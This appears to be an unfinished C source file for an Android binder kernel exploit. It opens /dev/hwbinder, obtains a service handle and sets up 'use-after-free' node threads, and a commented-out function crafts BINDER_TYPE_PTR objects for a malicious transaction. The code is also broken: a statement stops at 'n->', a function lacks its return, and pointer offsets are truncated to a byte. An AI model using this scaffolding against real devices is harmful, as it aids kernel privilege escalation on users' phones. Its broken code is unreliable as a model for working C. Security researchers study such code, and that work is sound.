#include "node.h"
#include "binder.h"

static struct new_node *_node_new(struct new_node *n, const char *name)
{
    struct binder_state *bs = NULL;
    pthread_t *uaf_node_th = NULL;
    uint32_t num_pending = 0x40;
    uint64_t vma_start = 0;
    uint64_t handle = 0;

    if(!n || !name) return NULL;

    if(!(bs = binder_open("/dev/hwbinder", 128*1024)))
    {
        return NULL;
    }
    if(!(handle = grab_handle(bs, name))) return NULL;

    if(!(uaf_node_th = calloc(num_pending + 1, sizeof(pthread_t))))
    {
        fprintf(stderr, "[-] Unable to allocate new pending node thread array: (%s)\n", strerror(errno));
        if(uaf_node_th) free(uaf_node_th);
        return NULL;
    }

    // Initialize new_node
    n->bs = bs;
    n->handle = handle;
    n->vma_start = vma_start;
    memset(n->name, 0, sizeof(n->name)-1);
    strncpy(n->name, name, sizeof(n->name)-1);
    n->th = uaf_node_th;
    n->idx = 0;
    n->

}

struct new_node *node(const char *name)
{
    struct new_node *n = NULL;
    if(!(n = calloc(1, sizeof(*n))))
    {
        fprintf(stderr, "[-] Unable to allocate new node: (%s)\n", strerror(errno));
        return NULL;
    }
    if(!_node_new(n, name))
    {
        free(n);
        return NULL;
    }
    return n;
}
/*
void create_node(){

    uint64_t handle = 0;
    uint8_t data[BINDER_BUFFER_SZ];
    uint64_t offsets[128];
    uint8_t sg_buf[0x1000];
    uint32_t readbuf[32];
    uint8_t *ptr = data;
    uint8_t *offs = offsets;
    uint8_t buf[0x100];
    uint32_t buflen = 0;

    memset(buf, 0, 0x100);
    memset(offsets, 0, 128*sizeof(uint64_t));
    
    // add BINDER_TYPE_PTR type binder object (parent)
    struct binder_buffer_object *obj = (struct binder_buffer_object*)ptr;
    obj->hdr.type = BINDER_TYPE_PTR;
    obj->flags = 0;
    obj->buffer = 0; // /dev/hwbinder가 userland에서 매핑된 시작 주소 
    obj->length = 0;
    obj->parent = 0;
    obj->parent_offset = 0;

    *(offs++) = ((uint8_t)obj) - data;
    ptr = ++obj; // obj는 다음 data buffer 가리키고 있음
    
    // add BINDER_TYPE_PTR type binder object
    obj->hdr.type = BINDER_TYPE_PTR;
    obj->flags = 0;
    obj->buffer = sg_buf; // /dev/hwbinder가 userland에서 매핑된 시작 주소
    obj->length = 0;
    obj->parent = 0;
    obj->parent_offset = 0;
    buflen += obj->length;

    *(offs++) = ((uint8_t)obj) - data;
    ptr = ++obj; // obj는 다음 data buffer 가리키고 있음
}
*/
